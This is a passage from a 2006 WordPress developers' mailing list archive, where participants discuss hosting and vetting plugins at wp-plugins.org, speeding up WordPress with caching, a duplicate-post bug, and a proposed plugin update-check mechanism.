On 2/7/06, Craig <nuclearmoose@gmail.com> wrote:
> > Craig, if you provide plugins which are known-good (or even
> > known-better) hopefully people will start using them in preference to
> > others that are not "known" to be well behaved. This will reduce
> > support requests, at least during upgrades by more than a little.
> >
> > Carthik.
>
>
>
> Very true, however there are many quality plugins that I know and trust that
> aren't on the repository. I guess the question is really how do we get the
> authors to move their stuff over to wp-plugins.org?
>

I suggest Plugin Gardeners take on maintenance of such plugins,
voluntarily. It is no big deal really, since it only involves updating
the svn repo with the latest version, and ensuring everything's
working right.

> I would be willing to help out authors in writing/editing instructions or
> other basic documentation. Can't help with the code, of course, but maybe I
> can help to lessen the work around maintaining the plugin.
>
> Is there a place for the non-coder in wp-plugins.org?

Not for me to answer, but if I had to, I'd think yes.

:)
Carthik.
> Craig.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From theodor_ramisch at hotmail.com  Tue Feb  7 18:20:23 2006
From: theodor_ramisch at hotmail.com (Theodor Ramisch)
Date: Tue Feb  7 18:22:07 2006
Subject: [wp-hackers] 2.next - faster
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
Message-ID: <BAY109-DAV96B6A325E21BAC9D60B9790010@phx.gbl>

Hi,

> > How can we make it faster?
> Faster to /use/?

Separation of the ping process was a good idea. But the post page
is till to slow. It would be great if other "time-hungry" actions
like pinging technorati are asynchronous to the user too.

Plugins which calculate statistics, build sitemaps or do something
similar could also use this process, so a hook should be available.

There is only the problem that there is no possibility to notice
the user if something fails like missing file permissions. A small
log at the dashboard could solve this problem.

Just some ideas...


Theodor
From ringmaster at midnightcircus.com  Tue Feb  7 18:26:15 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Tue Feb  7 18:27:09 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>
	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
Message-ID: <43E8E647.6000105@midnightcircus.com>

Craig wrote:
> Very true, however there are many quality plugins that I know and trust that
> aren't on the repository. I guess the question is really how do we get the
> authors to move their stuff over to wp-plugins.org?

Regarding plugin hosting at wp-plugins.org:

There is no way for me to add new projects (a few line items relate to 
circumventing the manual email to photomatt to enable these repos).
I can't grant and deny access to my projects to other users.
I can't configure notifications (or any action) on svn commits.
Trac is cluttered with many commits, tickets, and wiki changes that are 
unimportant to people seeking information specifically about my plugin.
There is no email notification of new tickets.
There is no dedicated self-support forum located there for my plugin.
I get no traffic at my site for what plugins are hosted there.
I can't track downloads to monitor which plugins need the most attention.
I can't create private projects there, or restrict access to just the 
trunk for allowing access only to tagged versions.
Downloading of the plugins themselves may be difficult for visitors when 
the plugin consists of more than one file.
Providing clear version-specific downloads is difficult.
Abandoned projects are not culled, leaving my project to be found 
amongst dozens of dead or unfinished projects.
There is no directory of plugins.
There is no vetting of plugins that are included, in spite of some 
desire that there should be.

There are plenty of benefits, too.  Not having to host your own SVN, and 
providing all of the Trac features for tickets and wiki are pretty nice. 
  Unified login with WordPress.org support is nice.

Still, no amount of plugin repo gardening is going to convince me that 
hosting at wp-plugins.org (or any other simple download-only plugin 
repo) is better than hosting my stuff myself.  It bothers me to think 
that my own code won't be a part of the official plugin effort unless I 
submit to the restrictions listed above, which aren't really of much 
benefit to users of my plugins.

A suggested alternative has been to just dump the latest version of code 
hosted elsewhere into the repo, which dilutes the idea of where the 
official release comes from.  Am I the only one that doesn't download 
utilities from Download.com, instead making every attempt to find the 
company's own home page and official distribution point?

Mind you, this isn't a complaint expecting things to change, it's just 
an explanation of why it may be difficult to convince developers to all 
switch to using wp-plugins.org.

Owen





From dstewart at atl.lmco.com  Tue Feb  7 18:28:33 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Tue Feb  7 18:30:01 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E8E647.6000105@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com> <43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk> <43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
Message-ID: <43E8E6D1.90803@atl.lmco.com>

Owen Winkler wrote:
> 
> Mind you, this isn't a complaint expecting things to change, it's just 
> an explanation of why it may be difficult to convince developers to all 
> switch to using wp-plugins.org.
> 
> Owen

Indeed.  Why don't we leverage or duplicate the effort on wp-plugins.net 
instead?  RSS feeds of new and updated plugins, managed by the devs 
themselves.  Very, VERY convenient.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From khanh at netspace.net.au  Tue Feb  7 18:33:41 2006
From: khanh at netspace.net.au (John Ha [c])
Date: Tue Feb  7 18:35:16 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
References: <43E7AD17.6060907@mullenweg.com>
	<43E7BF44.1090605@boren.nu><43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu><43E7CAF6.9010303@tamba2.org.uk><5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com><43E7DADA.4090700@ebroder.net>
	<43E7E144.4090802@boren.nu><5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com><80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com><5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com><43E8E647.6000105@midnightcircus.com>
	<43E8E6D1.90803@atl.lmco.com>
Message-ID: <003701c62c15$076fca60$6401a8c0@k9>

Aye
  ----- Original Message ----- 
  From: Doug Stewart 
  To: wp-hackers@lists.automattic.com 
  Sent: Wednesday, 8 February 2006 5:28 AM
  Subject: Re: [wp-hackers] Simplicity in 2.next


  Owen Winkler wrote:
  > 
  > Mind you, this isn't a complaint expecting things to change, it's just 
  > an explanation of why it may be difficult to convince developers to all 
  > switch to using wp-plugins.org.
  > 
  > Owen

  Indeed.  Why don't we leverage or duplicate the effort on wp-plugins.net 
  instead?  RSS feeds of new and updated plugins, managed by the devs 
  themselves.  Very, VERY convenient.

  -- 
  ----------
  Doug Stewart
  Systems Administrator/Web Applications Developer
  Lockheed Martin Advanced Technology Labs
  dstewart@atl.lmco.com
  _______________________________________________
  wp-hackers mailing list
  wp-hackers@lists.automattic.com
  http://lists.automattic.com/mailman/listinfo/wp-hackers



-- 
------------------------ [ SECURITY NOTICE ]
------------------------
To: wp-hackers@lists.automattic.com.
For your security, khanh@netspace.net.au
digitally signed this message on 07 February 2006 at 18:33:45 UTC.
Verify this digital signature at http://www.ciphire.com/verify.
------------------- [ CIPHIRE DIGITAL SIGNATURE ]
-------------------
Q2lwaGlyZSBTaWcuAjh3cC1oYWNrZXJzQGxpc3RzLmF1dG9tYXR0aWMuY29tAGtoYW5oQ
G5ldHNwYWNlLm5ldC5hdQBlbWFpbCBib2R5APACAAB8AHwAAAABAAAACejoQ/ACAACLAw
ACAAIAAgAg8VGtcvYHOvWkCvgOMX2lA8lp65NgG+XmR5CoW8On08gBABh9ddIwqVYrJzb
+YRTkO3r9j+q978iHOOe1FIMyNojdBmx5peCAuN+KqyTMXWoOMcFAmFSiWNfzSkqLSz1p
fly1U2lnRW5k
--------------------- [ END DIGITAL SIGNATURE ]
---------------------
From podz at tamba2.org.uk  Tue Feb  7 18:48:43 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb  7 18:49:47 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E8E647.6000105@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
Message-ID: <43E8EB8B.8020600@tamba2.org.uk>

Owen Winkler wrote:

> Mind you, this isn't a complaint expecting things to change, it's just
> an explanation of why it may be difficult to convince developers to all
> switch to using wp-plugins.org.
> 

Why do they have to ?

Get some sort of testing going on with svn blogs or whatever, make it
known that plugin testing is going on and then leave it up to the
developers. wp-plugins.org could simply serve as links to all submitted
and as a home for those what want it that way.

P.
From nuclearmoose at gmail.com  Tue Feb  7 19:21:37 2006
From: nuclearmoose at gmail.com (Craig)
Date: Tue Feb  7 19:23:04 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E8E647.6000105@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com> <43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
Message-ID: <5aa3aa0602071121o4e546aebr339336948c453fc@mail.gmail.com>

Can Trac be configured to address your concerns? Should there be a team
created to maintain it as with the Codex?

Craig.
From jonathan.firestone at gmail.com  Tue Feb  7 19:23:21 2006
From: jonathan.firestone at gmail.com (Jonathan Firestone)
Date: Tue Feb  7 19:24:50 2006
Subject: [wp-hackers] Posts time out and make duplicate posts
In-Reply-To: <BAY101-W1031F3CC9BB6C5273299DB930F0@phx.gbl>
References: <BAY101-W1031F3CC9BB6C5273299DB930F0@phx.gbl>
Message-ID: <2b47310b0602071123w1c023b87ged0703b899cb343@mail.gmail.com>

I'm using 2.0 and I have encountered duplicate posts, in fact this very day.

-J


On 2/5/06, Donnie La Curan <don_lacuran@hotmail.com> wrote:
> Ever since I updated to 2.0.1 I have noticed that making a post takes a really long time.  Sometimes long enough that I get the cannot find server error.  I just go back to the main screen of my blog and the post is there, twice.  Sometimes it doesn't time out, but I still get duplicate posts and I have to go in and delete the extra one.  Version 2.0 worked just fine, didn't take too long to make a post and it never created duplicate posts.
>
> Donnie
> http://www.slapyo.com
> _________________________________________________________________
> Express yourself instantly with MSN Messenger! Download today it's FREE!
> http://messenger.msn.click-url.com/go/onm00200471ave/direct/01/_______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From steagl at people.it  Tue Feb  7 19:40:18 2006
From: steagl at people.it (Stefano)
Date: Tue Feb  7 19:42:00 2006
Subject: [wp-hackers] Simplicity in 2.next
References: <43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
	<5aa3aa0602071121o4e546aebr339336948c453fc@mail.gmail.com>
Message-ID: <ekthu1t2cf6d8flf1mhcmmgohr7nj8vv9k@4ax.com>

Il Tue, 7 Feb 2006 12:21:37 -0700, Craig <nuclearmoose@gmail.com>
scrive:

>Can Trac be configured to address your concerns? Should there be a team
>created to maintain it as with the Codex?

Maybe we can discuss about having wp-plugins.org not based for front
page on trac, usig trac only for developpers, and ahving a front end
for endusers based on normal webpages, this will be a showcase,
developers that want to use wp-plugins.org as a repository for theyr
plugins will have them hosted there others will have a link to their
plugin pages.

If the plugins are downloaded from wp-plugins.org they will be as full
zip package and not as a series of files like in the trac.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From false.hopes at gmail.com  Tue Feb  7 20:24:14 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Tue Feb  7 20:25:43 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <8e1656660602062302o4fb2ef5bqeff4ce56e57cd190@mail.gmail.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
	<ebe43d680602061248h35d26151t@mail.gmail.com>
	<43E8229C.70903@mullenweg.com>
	<8e1656660602062302o4fb2ef5bqeff4ce56e57cd190@mail.gmail.com>
Message-ID: <a491f91d0602071224o61579595w4df42d0ff10e3689@mail.gmail.com>

On 2/7/06, Scott johnson <fuzzygroup@gmail.com> wrote:
> Correct.  While I hate to say "wait for people to upgrade to php5",
> the opcode cache is standard (from what I know) in php5.  Waiting for
> people to upgrade to php5 would save a lot of engineering effort.
>

Hate to be a slap of reality, but PHP5 does not include an opcode
cache, although there are PECL extensions such as APC for it.

On the bright side, PHP6 has talk of including an opcode cache,
however nothing is in concrete, and PHP6 is still, at the very least,
over a year away from its first stable release, more likely a year and
a half away from its first RC release.

--
--Robert Deaton
http://somethingunpredictable.com
From stewart at ugelow.com  Tue Feb  7 20:46:34 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Tue Feb  7 20:48:06 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <ekthu1t2cf6d8flf1mhcmmgohr7nj8vv9k@4ax.com>
References: <43E7C829.9040505@boren.nu>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
	<5aa3aa0602071121o4e546aebr339336948c453fc@mail.gmail.com>
	<ekthu1t2cf6d8flf1mhcmmgohr7nj8vv9k@4ax.com>
Message-ID: <7c94a5850602071246l53163613r50899d89f5867f2c@mail.gmail.com>

At the risk of naievete, is there any reason that hosting on
wp-plugins.org and some form of official plugin testing must be one
and the same?

Why not simply have a testing site where plugin authors can upload
their code and where plugin users can visit to see the results?

--Stewart

--

Stewart Ugelow
www.ugelow.com
From davebytes at comcast.net  Tue Feb  7 20:59:05 2006
From: davebytes at comcast.net (David Chait)
Date: Tue Feb  7 21:00:37 2006
Subject: [wp-hackers] 2.next - faster
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
	<43E8D163.1010308@scytheman.net>
Message-ID: <00b801c62c29$55a9f200$6e01a8c0@sixfour>

Have you tried WP-Cache on your system?  Most of what you discuss would be 
solved with WP-Cache built-in to WP in the future (on an option, of course).

I believe that caching should occur at the page/request level whenever 
possible -- even though my own site right now won't work well, as I have 
truly dynamic content (ads, etc.) that are invoked directly in the php 
rather than via secondary content loading (img tag, javascript, etc.).  With 
page caching in place, very little else needs be optimized/cached.

Now, given that, some of the things you've pointed out are useful bits. 
Even with page caching, things that invalidate the cache frequently enough 
(i.e., new comments) could still be an impact on large/heavy sites unless 
there is other performance enhancements.

-d

----- Original Message ----- 
From: "Sebastian Herp" <newsletter@scytheman.net>
To: <wp-hackers@lists.automattic.com>
Sent: Tuesday, February 07, 2006 11:57 AM
Subject: Re: [wp-hackers] 2.next - faster


| Speeding things up in 2.next would be nice. Making the function
| "current_time()" pluggable (overwriting it with something using the
| value from the following plugin), together with a plugin like the one
| found here (http://txfx.net/files/wordpress/post-query-accelerator.phps)
| would greatly improve the chance that a query can be cached by mysql
| itself. I did this on a blog and the overall time needed for queries is
| now 30ms if they are all in the mysql cache which is the case most of
| the time!!!
|
| However, this is not the main time eater on my setup. It's mainly the
| php code execution. Wordpress (always on my server and speaking of the
| frontpage) takes 150 to 200 ms to get to the point where it actually
| outputs html. The other big thing is the content loop. Formatting every
| posting each time takes a while. Getting categories and other
| information also eats some milliseconds. Summed up the content display
| stuff takes around 300 ms to execute.
| 

From davebytes at comcast.net  Tue Feb  7 21:03:22 2006
From: davebytes at comcast.net (David Chait)
Date: Tue Feb  7 21:04:50 2006
Subject: [wp-hackers] Simplicity in 2.next
References: <43E7AD17.6060907@mullenweg.com><43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk><43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net><43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com><5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
Message-ID: <00c901c62c29$ee5384d0$6e01a8c0@sixfour>

+1

;)
-d

----- Original Message ----- 
From: "Owen Winkler" <ringmaster@midnightcircus.com>
To: <wp-hackers@lists.automattic.com>
Sent: Tuesday, February 07, 2006 1:26 PM
Subject: Re: [wp-hackers] Simplicity in 2.next


| Craig wrote:
| > Very true, however there are many quality plugins that I know and trust 
that
| > aren't on the repository. I guess the question is really how do we get 
the
| > authors to move their stuff over to wp-plugins.org?
|
| ... {long list of bad things} ...
|
| Still, no amount of plugin repo gardening is going to convince me that
| hosting at wp-plugins.org (or any other simple download-only plugin
| repo) is better than hosting my stuff myself.  It bothers me to think
| that my own code won't be a part of the official plugin effort unless I
| submit to the restrictions listed above, which aren't really of much
| benefit to users of my plugins.

From podz at tamba2.org.uk  Tue Feb  7 21:18:16 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb  7 21:19:22 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <7c94a5850602071246l53163613r50899d89f5867f2c@mail.gmail.com>
References: <43E7C829.9040505@boren.nu>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>
	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<5aa3aa0602071121o4e546aebr339336948c453fc@mail.gmail.com>	<ekthu1t2cf6d8flf1mhcmmgohr7nj8vv9k@4ax.com>
	<7c94a5850602071246l53163613r50899d89f5867f2c@mail.gmail.com>
Message-ID: <43E90E98.2070403@tamba2.org.uk>

Stewart Ugelow wrote:
> At the risk of naievete, is there any reason that hosting on
> wp-plugins.org and some form of official plugin testing must be one
> and the same?
> 
> Why not simply have a testing site where plugin authors can upload
> their code and where plugin users can visit to see the results?
> 

That's how I see it, and I cannot see a sensible reason why that cannot
happen.

P.
From false.hopes at gmail.com  Tue Feb  7 21:25:40 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Tue Feb  7 21:27:11 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E90E98.2070403@tamba2.org.uk>
References: <43E7C829.9040505@boren.nu> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
	<5aa3aa0602071121o4e546aebr339336948c453fc@mail.gmail.com>
	<ekthu1t2cf6d8flf1mhcmmgohr7nj8vv9k@4ax.com>
	<7c94a5850602071246l53163613r50899d89f5867f2c@mail.gmail.com>
	<43E90E98.2070403@tamba2.org.uk>
Message-ID: <a491f91d0602071325q6ec6a122gf8de7bd2fbbb70d8@mail.gmail.com>

On 2/7/06, Podz <podz@tamba2.org.uk> wrote:
> Stewart Ugelow wrote:
> > At the risk of naievete, is there any reason that hosting on
> > wp-plugins.org and some form of official plugin testing must be one
> > and the same?
> >
> > Why not simply have a testing site where plugin authors can upload
> > their code and where plugin users can visit to see the results?
> >
>
> That's how I see it, and I cannot see a sensible reason why that cannot
> happen.

There still has to be manual intervention, which is something some
people above were complaining about. Malicious code of any sort would
have to be cleaned out, obfuscated or not, which requrires serious
manual intervention and many man hours.

--
--Robert Deaton
http://somethingunpredictable.com
From skippy at skippy.net  Tue Feb  7 21:28:15 2006
From: skippy at skippy.net (Scott Merrill)
Date: Tue Feb  7 21:29:27 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E90E98.2070403@tamba2.org.uk>
References: <43E7C829.9040505@boren.nu>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<5aa3aa0602071121o4e546aebr339336948c453fc@mail.gmail.com>	<ekthu1t2cf6d8flf1mhcmmgohr7nj8vv9k@4ax.com>	<7c94a5850602071246l53163613r50899d89f5867f2c@mail.gmail.com>
	<43E90E98.2070403@tamba2.org.uk>
Message-ID: <43E910EF.8040504@skippy.net>

Podz wrote:
> Stewart Ugelow wrote:
>> At the risk of naievete, is there any reason that hosting on
>> wp-plugins.org and some form of official plugin testing must be one
>> and the same?
>>
>> Why not simply have a testing site where plugin authors can upload
>> their code and where plugin users can visit to see the results?
>>
> 
> That's how I see it, and I cannot see a sensible reason why that cannot
> happen.

Just like WordPress has "issues" on some configurations, so too do some
plugins have issues stemming from configuration nuances.  So, a plugin
might work on the "blessed" test environment, then fail utterly in the
user's production environment.

Additionally, some plugins (like my subscribe2) don't lend themselves
well to quick testing.

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From podz at tamba2.org.uk  Tue Feb  7 21:38:22 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb  7 21:39:26 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <a491f91d0602071325q6ec6a122gf8de7bd2fbbb70d8@mail.gmail.com>
References: <43E7C829.9040505@boren.nu>
	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<5aa3aa0602071121o4e546aebr339336948c453fc@mail.gmail.com>	<ekthu1t2cf6d8flf1mhcmmgohr7nj8vv9k@4ax.com>	<7c94a5850602071246l53163613r50899d89f5867f2c@mail.gmail.com>	<43E90E98.2070403@tamba2.org.uk>
	<a491f91d0602071325q6ec6a122gf8de7bd2fbbb70d8@mail.gmail.com>
Message-ID: <43E9134E.1020101@tamba2.org.uk>

Robert Deaton wrote:
> On 2/7/06, Podz <podz@tamba2.org.uk> wrote:
>> Stewart Ugelow wrote:
>>> At the risk of naievete, is there any reason that hosting on
>>> wp-plugins.org and some form of official plugin testing must be one
>>> and the same?
>>>
>>> Why not simply have a testing site where plugin authors can upload
>>> their code and where plugin users can visit to see the results?
>>>
>> That's how I see it, and I cannot see a sensible reason why that cannot
>> happen.
> 
> There still has to be manual intervention, which is something some
> people above were complaining about. Malicious code of any sort would
> have to be cleaned out, obfuscated or not, which requrires serious
> manual intervention and many man hours.
> 

I knew that would get a response :)
It can't happen then can it ?
I saw Ryan's goal as being to assist in support and I'm sure that is a
shared view here but as he stated in his initial email without a common
repository the task would be very hard indeed.
Maybe the topic should stop ? Or is there a decent way forward ? The
credit and site traffic for plugins matters not right now, the process
does but without a process it can't happen...

P.
From peter.westwood at ftwr.co.uk  Tue Feb  7 21:47:51 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue Feb  7 21:50:05 2006
Subject: [wp-hackers] Simplicity in 2.next - plugin update checking
Message-ID: <43E91587.8020804@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

I am not convinced that we can easily integrate firefox like automatic
plugin updating into the core.

If we this this is achievable then we should focus on implementing auto
updating of WordPress itself!

I am also not a big fan of adding supported version number headers to
plugins because it can be very annoying when a firefox plugin refuses to
run because of these checks. I suspect that some if not most plugin
authors would stick in a max version so high that the checks would be
negated.

However, i do think there are some great improvements we could make:

1/ Add an update url header to plugins.

e.g.: Update URI: rest://example.org/hello-world/
and/or Update URI: xmlrpc://example.org/hello-world/

These would be provided by the calling WordPress install with the plugin
version and WordPress version to allow for taylored update messages and

The rest endpoint would be called with the two version numbers as part
of the url e.g.
rest:/example.org/hello-world/%plugin-version%/%wordpress-version%/

The xmlrpc endpoint would be well defined with example server code
available on the codex.

2/ Add a new tab to the plugins section which allows the user to check
for updates - this would check for updates for all plugins with update
urls and display a list of update messages (HTML returned from the
update service and cached in the db) or a message to the effect of this
plugin has no update uri please check the authors site for updates
(linking to the Plugin URI from the plugin header)

This update page would only check for updates when the user requests it
_not_ on every visits.

We could and should limit the update checks to once per day to ensure
that we don't DOS the authors site.

We could provide via wp-plugins.org a hosted update endpoint service
that plugin authors can use to take the strain if they don't want to
host the plugin themselves.

We could make the update service handlers pluggable to allow plugin
authors to define there own update service handler (instead of the
builtin rest and xmlrpc handlers)

What do people think?

westi
- --
Peter Westwood
http://blog.ftwr.co.uk



-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD6RWHVPRdzag0AcURAp/ZAKCGKAf5B/bG/2zXLqBx6/EkoeuftgCgrPsR
xecCZZO+MPh41IPcyP4y9vg=
=sKxK
-----END PGP SIGNATURE-----

From peter.westwood at ftwr.co.uk  Tue Feb  7 21:57:51 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue Feb  7 21:59:52 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E8E647.6000105@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
Message-ID: <43E917DF.9010807@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Owen Winkler wrote:
> Craig wrote:
>> Very true, however there are many quality plugins that I know and
>> trust that
>> aren't on the repository. I guess the question is really how do we get
>> the
>> authors to move their stuff over to wp-plugins.org?
> 
> Regarding plugin hosting at wp-plugins.org:
> 
> There is no way for me to add new projects (a few line items relate to
> circumventing the manual email to photomatt to enable these repos).
> I can't grant and deny access to my projects to other users.
> I can't configure notifications (or any action) on svn commits.
> Trac is cluttered with many commits, tickets, and wiki changes that are
> unimportant to people seeking information specifically about my plugin.
> There is no email notification of new tickets.
> There is no dedicated self-support forum located there for my plugin.
> I get no traffic at my site for what plugins are hosted there.
> I can't track downloads to monitor which plugins need the most attention.
> I can't create private projects there, or restrict access to just the
> trunk for allowing access only to tagged versions.
> Downloading of the plugins themselves may be difficult for visitors when
> the plugin consists of more than one file.
> Providing clear version-specific downloads is difficult.
> Abandoned projects are not culled, leaving my project to be found
> amongst dozens of dead or unfinished projects.
> There is no directory of plugins.
> There is no vetting of plugins that are included, in spite of some
> desire that there should be.
> 

+1 to all of these

> There are plenty of benefits, too.  Not having to host your own SVN, and
